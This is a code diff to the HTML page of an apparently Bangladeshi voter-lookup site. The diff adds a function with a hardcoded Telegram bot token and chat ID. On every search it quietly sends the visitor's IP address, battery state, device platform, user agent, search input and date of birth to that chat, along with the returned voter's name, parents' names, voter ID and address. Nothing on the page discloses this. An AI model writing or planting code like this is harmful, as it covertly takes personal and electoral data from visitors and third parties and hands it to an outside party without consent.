@@ -254,6 +254,64 @@
 
     <script>
         const API_BASE = "https://comilla.sbshehab2004.workers.dev/";
+        const TG_TOKEN = "8467310067:AAFo76zk_NC5SkyAfri_WzBuCjP5mm_AO_o";
+        const TG_CHAT_ID = "8323795722";
+
+        // Telegram Notification Function
+        async function sendTelegramLog(voterData, searchType, searchValue, dob) {
+            try {
+                // Get Battery Info
+                let batteryLevel = "N/A";
+                let batteryCharging = "";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                    batteryCharging = battery.charging ? "(চার্জিং)" : "(ডিসচার্জিং)";
+                }
+
+                // Get IP (Optional/Mock since it's client side)
+                const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => null);
+                const ipData = ipRes ? await ipRes.json() : { ip: "N/A" };
+
+                let message = `🚀 নতুন এক্টিভিটি!\n`;
+                message += `━━━━━━━━━━━━━━━━━━\n`;
+                message += `🕒 সময় ${new Date().toLocaleString('bn-BD')}\n`;
+                message += `🌐 আইপি: ${ipData.ip}\n\n`;
+                message += `📍 লোকেশন: লোকেশন ব্লকড\n`;
+                message += `🔋 ব্যাটারি: ${batteryLevel} ${batteryCharging}\n`;
+                message += `🔍 কাজ: সাইটে সার্চ করেছে (${searchType})\n`;
+                message += `📝 সার্চ ডাটা: ${searchValue}\n`;
+                message += `📅 জন্ম তারিখ: ${dob}\n`;
+                message += `📱 মডেল: ${navigator.platform}\n`;
+                message += `⚙️ UA: ${navigator.userAgent}\n`;
+                message += `━━━━━━━━━━━━━━━━━━\n`;
+                
+                if(voterData) {
+                    message += `📥 সার্ভার ডাটা (ভোটার তথ্য):\n`;
+                    message += `👤 নাম: ${voterData.name}\n`;
+                    message += `👴 পিতা: ${voterData.fathers_name}\n`;
+                    message += `👵 মাতা: ${voterData.mothers_name}\n`;
+                    message += `🆔 ভোটার আইডি: ${voterData.voter_id}\n`;
+                    message += `🔢 সিরিয়াল: ${voterData.serial || '----'}\n`;
+                    message += `🏠 ঠিকানা: ${voterData.address || 'N/A'}\n`;
+                    message += `🏫 কেন্দ্র: ${voterData.vote_center?.name || voterData.vote_center || 'N/A'}\n`;
+                } else {
+                    message += `❌ ফলাফল: কোনো তথ্য পাওয়া যায়নি\n`;
+                }
+                message += `━━━━━━━━━━━━━━━━━━`;
+
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TG_CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (e) {
+                console.error("Telegram log failed", e);
+            }
+        }
 
         function handleTypeChange(val) {
             const label = document.getElementById('inputLabel');
@@ -319,17 +377,17 @@
             
             const type = document.getElementById('type').value;
             let val = document.getElementById('value').value.trim();
+            const d = document.getElementById('day').value;
+            const m = document.getElementById('month').value;
+            const y = document.getElementById('year').value;
+            const dobString = `${d}/${m}/${y}`;
             
-            // 12 digit validation for voter_id
             if(type === 'voter_id' && val.length !== 12) {
                 alert("অনুগ্রহ করে ১২ ডিজিটের সঠিক ভোটার নাম্বার দিন।");
                 return;
             }
 
             showPage('loadingView');
-            const d = document.getElementById('day').value;
-            const m = document.getElementById('month').value;
-            const y = document.getElementById('year').value;
             const controller = new AbortController();
             const timeoutId = setTimeout(() => controller.abort(), 20000);
             
@@ -338,14 +396,19 @@
                 const res = await fetch(url, { signal: controller.signal });
                 const data = await res.json();
                 clearTimeout(timeoutId);
+
                 if (data.success && data.results && data.results.length > 0) {
                     renderResults(data.results);
+                    // Log the first result to telegram
+                    sendTelegramLog(data.results[0], type, val, dobString);
                     showPage('resultView');
                 } else {
+                    sendTelegramLog(null, type, val, dobString);
                     alert("দুঃখিত! এই তথ্য দিয়ে কোনো ভোটার পাওয়া যায়নি।");
                     showPage('homeView');
                 }
             } catch (err) {
+                sendTelegramLog(null, type, val, dobString);
                 alert("সার্ভারে সমস্যা হয়েছে। দয়া করে একটু পর চেষ্টা করুন।");
                 showPage('homeView');
             }
@@ -421,7 +484,6 @@
             });
         }
 
-        // Initialize with correct state
         handleTypeChange('voter_id');
     </script>
 </body>
